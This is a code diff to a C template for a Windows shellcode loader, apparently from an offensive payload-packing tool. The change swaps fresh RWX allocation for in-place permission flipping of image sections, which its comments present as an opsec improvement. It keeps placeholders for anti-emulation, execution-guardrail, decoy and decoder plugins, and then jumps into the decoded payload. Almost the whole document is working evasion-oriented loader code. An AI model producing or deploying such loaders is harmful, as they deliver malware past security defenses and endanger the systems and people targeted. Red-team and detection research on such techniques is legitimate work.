@@ -8,13 +8,13 @@ char *supermega_payload;
 #define p_RX  0x20
 #define p_RWX 0x40
 
+/* change payload memory regions permissions
+   will reuse IMAGE locations
 
-/* VirtualAlloc -> rw -> rwx
-
-   * create new memory region for the payload
-   * will set it to RWX (opsec-unsafe, allows in-memory decryption with sgn)
+   depending on payload injection:
+   * .text -> rw -> rx
+   * .rdata -> rw -> rx
 */
-
 
 {{plugin_antiemulation}}
 
@@ -25,7 +25,8 @@ char *supermega_payload;
 
 int main()
 {
-	DWORD result;
+    DWORD result;
+    char *dest = supermega_payload;
 
 	// Call: Execution Guardrail
 	if (executionguardrail() != 0) {
@@ -38,25 +39,18 @@ int main()
 	// Call: Decoy plugin
 	decoy();
 
-	// Allocate 1
-    // char *dest = ...
-    char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, p_RW);
+    if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RW, &result) == 0) {
+        return 16;
+    }
 
-	// Wait a bit
-	//sleep_ms(2000);
-
-	// Copy (and decode)
-	// from: supermega_payload[]
-	// to:   dest[]
 {{ plugin_decoder }}
 
-	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RWX, &result) == 0) {
-		return 7;
-	}
+    if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
+        return 16;
+    }
 
     // Execute *dest
     (*(void(*)())(dest))();
 
 	return 0;
 }
-
